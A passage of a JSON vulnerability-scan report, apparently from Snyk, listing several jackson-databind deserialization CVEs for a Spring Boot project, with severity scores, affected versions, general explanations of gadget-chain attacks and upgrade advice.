`com.fasterxml.jackson.core:jackson-databind` to version 2.9.10.8 or higher.\n## References\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2986)\n",
      "disclosureTime": "2020-12-18T11:32:48Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "2.9.10.8"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.10.0.pr1)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.10.0.pr1)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1052449",
      "identifiers": {
        "CVE": [
          "CVE-2020-35490"
        ],
        "CWE": [
          "CWE-502"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2021-08-25T15:56:23.781786Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-12-18T16:33:11Z",
      "references": [
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2986"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.9.10.8)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@2.0.0.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
      "alternativeIds": [],
      "creationTime": "2020-12-18T11:40:53.658144Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. It mishandles the interaction between serialization gadgets and typing, related to `org.apache.commons.dbcp2.datasources.SharedPoolDataSource`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)), is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, letting the attacker to control the state or the flow of the execution.\n\nJava deserialization issues have been known for years. However, interest in the issue intensified greatly in 2015, when classes that could be abused to achieve remote code execution were found in a [popular library (Apache Commons Collection)](https://snyk.io/vuln/SNYK-JAVA-COMMONSCOLLECTIONS-30078). These classes were used in zero-days affecting IBM WebSphere, Oracle WebLogic and many other products.\n\n  \nAn attacker just needs to identify a piece of software that has both a vulnerable class on its path, and performs deserialization on untrusted data. Then all they need to do is send the payload into the deserializer, getting the command executed.\n  \n\n> Developers put too much trust in Java Object Serialization. Some even de-serialize objects pre-authentication. When deserializing an Object in Java you typically cast it to an expected type, and therefore Java's strict type system will ensure you only get valid object trees. Unfortunately, by the time the type checking happens, platform code has already created and executed significant logic. So, before the final type is checked a lot of code is executed from the readObject() methods of various objects, all of which is out of the developer's control. By combining the readObject() methods of various classes which are available on the classpath of the vulnerable application an attacker can execute functions (including calling Runtime.exec() to execute local OS commands).\n\n- Apache Blog\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.9.10.8 or higher.\n## References\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2986)\n",
      "disclosureTime": "2020-12-18T11:40:13Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "2.9.10.8"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.10.0.pr1)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.10.0.pr1)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1052450",
      "identifiers": {
        "CVE": [
          "CVE-2020-35491"
        ],
        "CWE": [
          "CWE-502"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2021-08-25T15:57:34.286750Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-12-18T16:33:11Z",
      "references": [
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2986"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.9.10.8)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@2.0.0.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
      "alternativeIds": [],
      "creationTime": "2020-12-27T14:34:18.527699Z",
      "credit": [
        "bu5yer"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. It mishandles the interaction between serialization gadgets and typing, related to `com.oracle.wls.shaded.org.apache.xalan.lib.sql.JNDIConnectionPool` (aka embedded Xalan in `org.glassfish.web/javax.servlet.jsp.jstl`).\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Don’t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.9.10.8 or higher.\n## References\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2999)\n- [Medium Post](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n- [PoC](https://github.com/Al1ex/CVE-2020-35728)\n",
      "disclosureTime": "2020-12-27T14:05:38Z",
      "exploit": "Proof of Concept",
      "fixedIn": [
        "2.9.10.8"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.0.0, 2.9.10.8)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.0.0, 2.9.10.8)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1054588",
      "identifiers": {
        "CVE": [
          "CVE-2020-35728"
        ],
        "CWE": [
          "CWE-502"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2021-08-25T15:59:33.790019Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-12-27T17:34:55Z",
      "references": [
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2999"
        },
        {
          "title": "Medium Post",
          "url": "https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062"
        },
        {
          "title": "PoC",
          "url": "https://github.com/Al1ex/CVE-2020-35728"
        }
      ],
      "semver": {
        "vulnerable": [
          "[2.0.0, 2.9.10.8)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@2.0.0.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2021-01-07T12:47:33.579319Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. The package mishandles the interaction between serialization gadgets and typing, related to `org.apache.tomcat.dbcp.dbcp.datasources.SharedPoolDataSource`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Don’t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.9.10.8 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/3e8fa3beea49ea62109df9e643c9cb678dabdde1)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2997)\n- [Medium Article](https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n",
      "disclosureTime": "2021-01-07T12:44:41Z",
      "exploit": "Unproven",
      "fixedIn": [
        "2.9.10.8"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.8)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.8)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1056414",
      "identifiers": {
        "CVE": [
          "CVE-2020-36187"
        ],
        "CWE": [
          "CWE-502"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2021-01-07T16:40:33.972718Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-01-07T16:40:33.970819Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/3e8fa3beea49ea62109df9e643c9cb678dabdde1"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2997"
        },
        {
          "title": "Medium Article",
          "url": "https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.9.10.8)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@2.0.0.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2021-01-07T13:02:15.197495Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. The package mishandles the interaction between serialization gadgets and typing, related to `org.apache.tomcat.dbcp.dbcp2.datasources.PerUserPoolDataSource`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Don’t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.9.10.8 or higher.\n## References\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2998)\n- [Medium Article](https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n- [PoC](https://github.com/Al1ex/CVE-2020-36184)\n",
      "disclosureTime": "2021-01-07T13:00:25Z",
      "exploit": "Proof of Concept",
      "fixedIn": [
        "2.9.10.8"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.8)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.8)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1056416",
      "identifiers": {
        "CVE": [
          "CVE-2020-36184"
        ],
        "CWE": [
          "CWE-502"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2021-01-12T12:51:46.193012Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-01-07T16:40:33Z",
      "references": [
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2998"
        },
        {
          "title": "Medium Article",
          "url": "https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062"
        },
        {
          "title": "PoC",
          "url": "https://github.com/Al1ex/CVE-2020-36184"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.9.10.8)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@2.0.0.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2021-01-07T13:05:16.831143Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. The package mishandles the interaction between serialization gadgets and typing, related to `org.apache.tomcat.dbcp.dbcp.datasources.PerUserPoolDataSource`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Don’t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.9.10.8 or higher.\n## References\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2997)\n- [Medium Article](https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n",
      "disclosureTime": "2021-01-07T13:00:26Z",
      "exploit": "Unproven",
      "fixedIn": [
        "2.9.10.8"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.8)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.8)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1056417",
      "identifiers": {
        "CVE": [
          "CVE-2020-36186"
        ],
        "CWE": [
          "CWE-502"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2021-01-07T16:40:34.208000Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-01-07T16:40:34.206083Z",
      "references": [
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2997"
        },
        {
          "title": "Medium Article",
          "url": "https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.9.10.8)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@2.0.0.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2021-01-07T13:08:29.105792Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. The package mishandles the interaction between serialization gadgets and typing, related to `org.apache.commons.dbcp2.cpdsadapter.DriverAdapterCPDS`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Don’t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.9.10.8 or higher.\n## References\n- [Al1ex's Poc](https://github.com/Al1ex/CVE-2020-36179)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/3004)\n- [Medium Article](https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n",
      "disclosureTime": "2021-01-07T13:05:51Z",
      "exploit": "Proof of Concept",
      "fixedIn": [
        "2.9.10.8"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
          },
          "version": [
